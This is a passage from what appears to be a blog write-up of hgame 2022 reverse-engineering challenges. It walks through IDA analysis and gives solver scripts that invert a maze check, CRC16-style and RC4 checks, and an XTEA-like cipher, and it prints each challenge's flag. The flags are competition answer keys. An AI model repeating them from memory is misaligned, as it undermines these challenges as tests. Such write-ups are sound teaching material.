class="comment">#当下一次这条路不通就退回去，并根据上次的n变量不选择上一次的路</span></span><br><span class="line">        j = j + n[i]</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ((maze[j+<span class="number">8</span>]==<span class="number">32</span>)&amp;(n[i]!=<span class="number">8</span>)):</span><br><span class="line">        flag[i] = <span class="number">2</span></span><br><span class="line">        n[i] = <span class="number">8</span></span><br><span class="line">        j = j + n[i]</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ((maze[j+<span class="number">64</span>]==<span class="number">32</span>)&amp;(n[i]!=<span class="number">64</span>)):</span><br><span class="line">        flag[i] = <span class="number">1</span></span><br><span class="line">        n[i] = <span class="number">64</span></span><br><span class="line">        j = j + n[i]</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ((maze[j+<span class="number">512</span>]==<span class="number">32</span>)&amp;(n[i]!=<span class="number">512</span>)):</span><br><span class="line">        flag[i] = <span class="number">0</span></span><br><span class="line">        n[i] = <span class="number">512</span></span><br><span class="line">        j = j + n[i]</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    i = i - <span class="number">1</span></span><br><span class="line">    j = j - n[i]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):        <span class="comment">#while后就把flag都找出来了，下面在做字符串转换，以方便打印flag</span></span><br><span class="line">    <span class="keyword">if</span>(flag[i]==<span class="number">0</span>):</span><br><span class="line">        flag[i] = <span class="number">48</span></span><br><span class="line">    <span class="keyword">if</span>(flag[i]==<span class="number">1</span>):</span><br><span class="line">        flag[i] = <span class="number">49</span></span><br><span class="line">    <span class="keyword">if</span>(flag[i]==<span class="number">2</span>):</span><br><span class="line">        flag[i] = <span class="number">50</span></span><br><span class="line">    <span class="keyword">if</span>(flag[i]==<span class="number">3</span>):</span><br><span class="line">        flag[i] = <span class="number">51</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{3120113031203203222231003011}</strong></p>
<h2 id="upx-magic-0"><a href="#upx-magic-0" class="headerlink" title="upx magic 0"></a>upx magic 0</h2><p>这道题很怪，它的题目是和upx压缩保护有关，但用IDA并没有发现这是个包装程序；</p>
<p>IDA分析：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/0a36b69b65aef974.png" alt="function"></p>
<p>进入start函数后，可以找到一个叫 sub_400BBD 的函数，进入后，发现这就是要找的目标函数（右图）；</p>
<p>输入32个字符，用输入的字符进行for运算，最后变成chan变量；</p>
<p>然后用chan变量和v14变量比较与否；那么可以用给的v14变量通过for的逆运算算回输入的字符；或者爆破；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">0</span>] * <span class="number">33</span> <span class="comment">#输入的data</span></span><br><span class="line"></span><br><span class="line">p = [<span class="number">0x00008D68</span>, <span class="number">0x00009D49</span>, <span class="number">0x00002A12</span>, <span class="number">0x0000AB1A</span>, <span class="number">0x0000CBDC</span>, <span class="number">0x0000B92B</span>, <span class="number">0x00002E32</span>, <span class="number">0x00009F59</span>, <span class="number">0x0000DDCD</span>, <span class="number">0x00009D49</span>, <span class="number">0x0000A90A</span>, <span class="number">0x00000E70</span>, <span class="number">0x0000F5CF</span>, <span class="number">0x00000A50</span>, <span class="number">0x00005AF5</span>, <span class="number">0x0000FF9F</span>, <span class="number">0x00009F59</span>, <span class="number">0x0000BD0B</span>, <span class="number">0x000058E5</span>, <span class="number">0x00003823</span>, <span class="number">0x0000BF1B</span>, <span class="number">0x000078A7</span>, <span class="number">0x0000AB1A</span>, <span class="number">0x000048C4</span>, <span class="number">0x0000A90A</span>, <span class="number">0x00002C22</span>, <span class="number">0x00009F59</span>, <span class="number">0x00005CC5</span>, <span class="number">0x00005ED5</span>, <span class="number">0x000078A7</span>, <span class="number">0x00002672</span>, <span class="number">0x00005695</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">j = <span class="number">30</span>   <span class="comment">#p是已知变量v14</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">while</span>(j&lt;<span class="number">128</span>):   <span class="comment">#使用爆破找 30 ~ 128 之间满足算法的数字；</span></span><br><span class="line">        d[i] = j</span><br><span class="line">        v = d[i] &lt;&lt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>((v&amp;<span class="number">0x8000</span>)!=<span class="number">0</span>):</span><br><span class="line">                v = (<span class="number">2</span>*v) ^ <span class="number">0x1021</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v = <span class="number">2</span>*v</span><br><span class="line">        <span class="keyword">if</span>(p[i] == v &amp; <span class="number">0xffff</span>):  <span class="comment"># &amp;运算规范位数</span></span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            j = <span class="number">30</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d[<span class="number">32</span>] = <span class="number">0</span>   <span class="comment">#为打印flag字符串做准备</span></span><br><span class="line">d.remove(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    d[i] = <span class="built_in">chr</span>(d[i])</span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;&#x27;</span>.join(d)</span><br><span class="line">d = <span class="string">&#x27;hgame&#123;&#x27;</span> + d + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{noW_YOu<del>koNw-UPx</del>mAG|C_@Nd~crC16}</strong></p>
<h2 id="fake-shell"><a href="#fake-shell" class="headerlink" title="fake shell"></a>fake shell</h2><p>运行程序后，是一个模仿 Linux 终端的玩意儿，打开flag.txt需要sudo密码：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/e1bbb9fd34d5608c.png" alt="shell"></p>
<p>没办法就开IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/90462130e80bb2c9.png" alt="function"></p>
<p>从左往右看，第一张图是main函数，找到使用sudo命令后运行的函数：sub_559D9EE5B9E9；</p>
<p>第二张是进入这个函数后的内容，可以看到需要输入密码v4，32个字符长度，然后进入加密函数：rc4；</p>
<p>第三张就是rc4的加密了，先用rc4_init函数和已知密钥:aHappyhg4me字符串创建Sbox，再用rc4_crypto加密输入数据，最后用加密后的数据与v7变量比较与否；</p>
<p>因为rc4加密的异或运算，导致加密后的数据再用原函数加密一遍就可以变回加密前的数据；</p>
<p>所以代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0xB6</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x8F</span>, <span class="number">0x3D</span>, <span class="number">0x5F</span>, <span class="number">0xB2</span>, <span class="number">0xE0</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>, <span class="number">0xD2</span>, <span class="number">0x66</span>, <span class="number">0x98</span>, <span class="number">0x6C</span>, <span class="number">0x9D</span>, <span class="number">0xE7</span>, <span class="number">0x1B</span>, <span class="number">0x08</span>, <span class="number">0x40</span>, <span class="number">0x71</span>, <span class="number">0xC5</span>, <span class="number">0xBE</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x09</span>, <span class="number">0x8D</span>, <span class="number">0xA8</span>, <span class="number">0xBD</span>, <span class="number">0xF3</span>, <span class="number">0xF6</span>]</span><br><span class="line">box = [<span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0x54</span>, <span class="number">0xD3</span>, <span class="number">0xD1</span>, <span class="number">0xFC</span>, <span class="number">0x87</span>, <span class="number">0x2F</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x1B</span>, <span class="number">0xA4</span>, <span class="number">0x22</span>, <span class="number">0x6A</span>, <span class="number">0xEF</span>, <span class="number">0x17</span>, <span class="number">0x4F</span>, <span class="number">0x04</span>, <span class="number">0xB4</span>, <span class="number">0x3D</span>, <span class="number">0x40</span>, <span class="number">0x36</span>, <span class="number">0xA0</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0x1D</span>, <span class="number">0x8A</span>, <span class="number">0x57</span>, <span class="number">0xAD</span>, <span class="number">0xFD</span>, <span class="number">0x7D</span>, <span class="number">0xF6</span>, <span class="number">0x48</span>, <span class="number">0xE2</span>, <span class="number">0x7F</span>, <span class="number">0xD4</span>, <span class="number">0x1A</span>, <span class="number">0x1F</span>, <span class="number">0x15</span>, <span class="number">0x9F</span>, <span class="number">0xC0</span>, <span class="number">0x89</span>, <span class="number">0xBB</span>, <span class="number">0x3F</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x1C</span>, <span class="number">0xA3</span>, <span class="number">0x2E</span>, <span class="number">0x6D</span>, <span class="number">0x68</span>, <span class="number">0xC5</span>, <span class="number">0x0E</span>, <span class="number">0x18</span>, <span class="number">0x90</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>, <span class="number">0xD6</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0x11</span>, <span class="number">0xDA</span>, <span class="number">0x95</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x72</span>, <span class="number">0x2D</span>, <span class="number">0xA1</span>, <span class="number">0x0F</span>, <span class="number">0x50</span>, <span class="number">0x7A</span>, <span class="number">0xB0</span>, <span class="number">0xBC</span>, <span class="number">0x8D</span>, <span class="number">0xBA</span>, <span class="number">0xCC</span>, <span class="number">0x56</span>, <span class="number">0x88</span>, <span class="number">0xCF</span>, <span class="number">0xCB</span>, <span class="number">0xC7</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x42</span>, <span class="number">0x9E</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0xF0</span>, <span class="number">0xE9</span>, <span class="number">0x49</span>, <span class="number">0xDF</span>, <span class="number">0x71</span>, <span class="number">0x98</span>, <span class="number">0x6B</span>, <span class="number">0xB1</span>, <span class="number">0xB5</span>, <span class="number">0xE7</span>, <span class="number">0xF8</span>, <span class="number">0x67</span>, <span class="number">0x24</span>, <span class="number">0xBF</span>, <span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0xE5</span>, <span class="number">0x8E</span>, <span class="number">0x0B</span>, <span class="number">0x29</span>, <span class="number">0x63</span>, <span class="number">0x85</span>, <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0xD2</span>, <span class="number">0x4E</span>, <span class="number">0xED</span>, <span class="number">0xA7</span>, <span class="number">0x41</span>, <span class="number">0x8C</span>, <span class="number">0xD7</span>, <span class="number">0x43</span>, <span class="number">0x60</span>, <span class="number">0xD9</span>, <span class="number">0xB8</span>, <span class="number">0xEC</span>, <span class="number">0xD5</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>, <span class="number">0x08</span>, <span class="number">0xC1</span>, <span class="number">0x5D</span>, <span class="number">0x86</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x7B</span>, <span class="number">0xCA</span>, <span class="number">0xAB</span>, <span class="number">0xE0</span>, <span class="number">0x96</span>, <span class="number">0x83</span>, <span class="number">0x2A</span>, <span class="number">0x3C</span>, <span class="number">0xB7</span>, <span class="number">0xDD</span>, <span class="number">0xDC</span>, <span class="number">0x3B</span>, <span class="number">0x19</span>, <span class="number">0x99</span>, <span class="number">0xD0</span>, <span class="number">0xA9</span>, <span class="number">0xDE</span>, <span class="number">0xC6</span>, <span class="number">0x02</span>, <span class="number">0xD8</span>, <span class="number">0x5C</span>, <span class="number">0xF3</span>, <span class="number">0x52</span>, <span class="number">0x9B</span>, <span class="number">0x09</span>, <span class="number">0x64</span>, <span class="number">0x30</span>, <span class="number">0x91</span>, <span class="number">0xC9</span>, <span class="number">0xC3</span>, <span class="number">0xF2</span>, <span class="number">0x2C</span>, <span class="number">0x25</span>, <span class="number">0xE6</span>, <span class="number">0x9C</span>, <span class="number">0xEE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x81</span>, <span class="number">0x20</span>, <span class="number">0x59</span>, <span class="number">0xFE</span>, <span class="number">0xFB</span>, <span class="number">0xAA</span>, <span class="number">0xCD</span>, <span class="number">0x16</span>, <span class="number">0x27</span>, <span class="number">0x76</span>, <span class="number">0xFA</span>, <span class="number">0x33</span>, <span class="number">0xB9</span>, <span class="number">0xE1</span>, <span class="number">0x1E</span>, <span class="number">0xF5</span>, <span class="number">0x4C</span>, <span class="number">0xEA</span>, <span class="number">0xF1</span>, <span class="number">0xBE</span>, <span class="number">0xF4</span>, <span class="number">0x05</span>, <span class="number">0xA2</span>, <span class="number">0x93</span>, <span class="number">0x2B</span>, <span class="number">0xA5</span>, <span class="number">0x12</span>, <span class="number">0xA6</span>, <span class="number">0x21</span>, <span class="number">0xE8</span>, <span class="number">0x51</span>, <span class="number">0xCE</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>, <span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x8F</span>, <span class="number">0x6E</span>, <span class="number">0x9A</span>, <span class="number">0x3E</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x06</span>, <span class="number">0x14</span>, <span class="number">0xEB</span>, <span class="number">0x82</span>, <span class="number">0xE3</span>, <span class="number">0x97</span>, <span class="number">0x69</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0x94</span>, <span class="number">0x03</span>, <span class="number">0x39</span>, <span class="number">0xC4</span>, <span class="number">0x47</span>, <span class="number">0xBD</span>, <span class="number">0xAC</span>, <span class="number">0x78</span>, <span class="number">0x55</span>, <span class="number">0xAF</span>, <span class="number">0x37</span>, <span class="number">0xC2</span>, <span class="number">0x4A</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x8B</span>, <span class="number">0x31</span>, <span class="number">0xC8</span>, <span class="number">0x4B</span>, <span class="number">0x38</span>, <span class="number">0x58</span>, <span class="number">0xF9</span>]</span><br><span class="line">			<span class="comment">#data是v7比较数据，box是偷懒调试经过rc4_init函数后直接复制出来用</span></span><br><span class="line">v5 =<span class="number">0</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):   <span class="comment">#rc4加密主体</span></span><br><span class="line">    v5 = (v5+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v6 = (v6+box[v5]) % <span class="number">256</span></span><br><span class="line">    v4 = box[v5]</span><br><span class="line">    box[v5] = box[v6]</span><br><span class="line">    box[v6] = v4</span><br><span class="line">    data[i] = data[i] ^ box[(box[v5]+box[v6])%<span class="number">256</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):  <span class="comment">#变字符串得到sudo密码</span></span><br><span class="line">    data[i] = <span class="built_in">chr</span>(data[i])</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<p><strong>结果发现sudo密码就是flag：hgame{s0meth1ng_run_bef0r_m4in?}</strong></p>
<h2 id="creakme2"><a href="#creakme2" class="headerlink" title="creakme2"></a>creakme2</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/03a4421546a9b637.png" alt="main"></p>
<p>这是main函数，首先定义了一个num数组，然后输入32个字符，接着经过四次crypto加密，而从定义变量可以看出，input只有8个长度，所以这四个加密的意义就是把32个字符分成了四分，每份8个字符进入crypto单独加密，之后再拼凑在一起；最后把运算出来的字符串与cmp变量比较与否；</p>
<p>再来看crypto函数：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/c56b92b290371c9c.png" alt="crypto"></p>
<p>输入的a1是稳定的32，用于循环控轮次；输入的a2是8个字符；输入的a3是num数组；</p>
<p>这个for运算，是让前4个字符用后4个字符和num以及v4运算得到；让后4个字符通过变化后的前4个字符和v4以及不变的num运算得到；这个过程持续32轮；</p>
<p>那么可以倒着来算，把数据算回来；用给定的比较数组cmp当已知，先算后4个字符，因为变化后的v4和前4个字符是已知的，就可以减回去；之后减一遍v4，就可以用还原的后4个字符与v4算前4个字符了，然后持续32轮；</p>
<p>这个算法肯定没问题，但就是算不对，因为最终的v4应该变为0，但运算结果v4却不是0；</p>
<p>是什么原因呢？打开汇编层代码进行查找，于是就发现了一个神奇的东西：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/1b35c2f4e4513d7c.png" alt="asm"></p>
<p>这一部分是翻译为了 v4 += 9E3779B1；[rsp+58h+var_38] 这个地址，代表的就是v4；</p>
<p>可以看出上半部分的运算是没问题的，确实翻译成伪代码就是这个意思；但之后它把eax右移31位（这个时候eax等于v4）得到符号位，然后传送给ecx，之后用ecx来做除法，如果这个数是正数，那么符号位为0，这样算肯定有问题；所以就会有异常处理；</p>
<p>一旦出现了异常处理，就会使得下半部分的运算进行，把v4异或上0x1234567；这就是为什么光看伪代码找不出错误原因的地方；按照它这个思路，可以写出如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x457E62CF</span>, <span class="number">0x9537896C</span>, <span class="number">0x1F7E7F72</span>, <span class="number">0xF7A073D8</span>, <span class="number">0x8E996868</span>, <span class="number">0x40AFAF99</span>, <span class="number">0x0F990E34</span>, <span class="number">0x196F4086</span></span><br><span class="line">&#125;;  <span class="comment">//data是cmp比较数据</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v4;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5,v6;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sign; <span class="comment">//表示符号的数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">int</span> box[<span class="number">32</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flag[<span class="number">32</span>];</span><br><span class="line">	<span class="keyword">char</span> ascii[<span class="number">33</span>];</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j+=<span class="number">2</span>) <span class="comment">//分四组运算</span></span><br><span class="line">	&#123;</span><br><span class="line">		v5 = data[j];</span><br><span class="line">		v6 = data[j+<span class="number">1</span>];</span><br><span class="line">		v4 = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) <span class="comment">//算出v4的32轮中的情况并记录，以方便倒着算；</span></span><br><span class="line">		&#123;</span><br><span class="line">			v4 += <span class="number">0x9E3779B1</span>;</span><br><span class="line">			</span><br><span class="line">			sign = v4 &gt;&gt; <span class="number">31</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(sign==<span class="number">0</span>) <span class="comment">//模拟异常处理</span></span><br><span class="line">			&#123;</span><br><span class="line">				v4 ^= <span class="number">0x1234567</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			box[i] = v4;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">31</span>;i&gt;=<span class="number">0</span>;i--) <span class="comment">//倒着算</span></span><br><span class="line">		&#123;</span><br><span class="line">			v6 -= (num[(box[i] &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + box[i]) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">			</span><br><span class="line">			v5 -= (num[box[i<span class="number">-1</span>] &amp; <span class="number">3</span>] + box[i<span class="number">-1</span>]) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		data[j] = v5;</span><br><span class="line">		data[j+<span class="number">1</span>] = v6;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) <span class="comment">//下面在为输出flag字符串准备，因为data是DWORD型数组</span></span><br><span class="line">	&#123;</span><br><span class="line">		flag[i] = (data[i/<span class="number">4</span>] &lt;&lt; <span class="number">8</span>*(<span class="number">4</span>-((i+<span class="number">1</span>)%<span class="number">4</span>))) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ascii[i] = flag[i];</span><br><span class="line">	&#125;</span><br><span class="line">	ascii[<span class="number">32</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,ascii);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{SEH_s0und5_50_1ntere5ting}</strong></p>
<h2 id="upx-magic-1"><a href="#upx-magic-1" class="headerlink" title="upx magic 1"></a>upx magic 1</h2><p>这个是用upx加壳的内容，用checksec就可以知道，但upx -d 命令对它没用；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/e99cec8ef8dba67b.png" alt="upx1"></p>
<p>用十六进制查看器搜索upx后发现原标准标记upx! 被改成了upx? 所以搜搜机器没有发现它是一个upx加壳；</p>
<p>将改过的标记改回来后脱壳：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/05d8f246b3bf3346.png" alt="upx2"></p>
<p>之后用IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/33833137dafabc00.png" alt="function"></p>
<p>左上是start起始位置，进入sub_400B8D函数，可以从文中知道这个就是main函数；</p>
<p>可以看出，输入的flag长度需要为37，然后进行for循环的运算，之后与v14进行比较与否，这系列操作就和upx0一模一样了；</p>
<p>解题代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">0</span>] * <span class="number">38</span> <span class="comment">#输入的data</span></span><br><span class="line"></span><br><span class="line">p = [<span class="number">0x00008D68</span>, <span class="number">0x00009D49</span>, <span class="number">0x00002A12</span>, <span class="number">0x0000AB1A</span>, <span class="number">0x0000CBDC</span>, <span class="number">0x0000B92B</span>, <span class="number">0x00002E32</span>, <span class="number">0x00009F59</span>, <span class="number">0x0000DDCD</span>, <span class="number">0x00009D49</span>, <span class="number">0x0000A90A</span>, <span class="number">0x00000E70</span>, <span class="number">0x0000F5CF</span>, <span class="number">0x00005ED5</span>, <span class="number">0x00003C03</span>, <span class="number">0x00007C87</span>, <span class="number">0x00002672</span>, <span class="number">0x0000AB1A</span>, <span class="number">0x00000A50</span>, <span class="number">0x00005AF5</span>, <span class="number">0x0000FF9F</span>, <span class="number">0x00009F59</span>, <span class="number">0x0000BD0B</span>, <span class="number">0x000058E5</span>, <span class="number">0x00003823</span>, <span class="number">0x0000BF1B</span>, <span class="number">0x000078A7</span>, <span class="number">0x0000AB1A</span>, <span class="number">0x000048C4</span>, <span class="number">0x0000A90A</span>, <span class="number">0x00002C22</span>, <span class="number">0x00009F59</span>, <span class="number">0x00005CC5</span>, <span class="number">0x00005ED5</span>, <span class="number">0x000078A7</span>, <span class="number">0x00002672</span>, <span class="number">0x00005695</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">j = <span class="number">30</span>   <span class="comment">#p是已知变量v14</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">while</span>(j&lt;<span class="number">128</span>):   <span class="comment">#使用爆破找 30 ~ 128 之间满足算法的数字；</span></span><br><span class="line">        d[i] = j</span><br><span class="line">        v = d[i] &lt;&lt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>((v&amp;<span class="number">0x8000</span>)!=<span class="number">0</span>):</span><br><span class="line">                v = (<span class="number">2</span>*v) ^ <span class="number">0x1021</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v = <span 